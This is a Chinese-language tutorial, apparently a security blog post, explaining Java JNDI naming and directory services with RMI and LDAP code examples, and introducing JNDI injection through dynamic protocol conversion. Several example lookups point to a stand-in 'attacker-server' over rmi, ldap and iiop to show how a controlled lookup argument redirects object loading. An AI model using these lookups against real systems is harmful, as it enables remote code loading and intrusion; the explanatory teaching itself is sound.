# JNDI与JNDI注入
## JNDI
JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。

### Naming Service
命名服务是将名称与值相关联的实体，称为"绑定"。它提供了一种使用"find"或"search"操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如RMI Registry就是使用的Naming Service。

### Directory Service
是一种特殊的Naming Service，它允许存储和搜索"目录对象"，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。

### JNDI概念
-   **原子名**是一个简单、基本、不可分割的组成部分
-   **绑定**是名称与对象的关联，每个绑定都有一个不同的原子名
-   **复合名**包含零个或多个原子名，即由多个绑定组成
-   **上下文**是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名
-   **命名系统**是一组关联的上下文
-   **名称空间**是命名系统中包含的所有名称
-   **初始上下文**是探索名称空间的起点
-   要获取初始上下文，需要使用初始上下文工厂

### JNDI的好处
JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的**JNDI动态协议转换**。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。

### JNDI示例
#### RMI
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:9999");
Context ctx = new InitialContext(env);

//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
ctx.bind("refObj", new RefObject());

//通过名称查找对象
ctx.lookup("refObj");
```
#### LDAP
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
 "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

DirContext ctx = new InitialDirContext(env);

//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
```
#### JNDI动态协议转换
上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。

例如：
```java
Context ctx = new InitialContext();
ctx.lookup("rmi://attacker-server/refObj");
//ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
//ctx.lookup("iiop://attacker-server/bar");
```

再如下面的：
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:9999");
Context ctx = new InitialContext(env);

String name = "ldap://attacker-server/cn=bar,dc=test,dc=org";
//通过名称查找对象
ctx.lookup(name);
```
即使服务端提前设置了工厂与PROVIDER_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换。

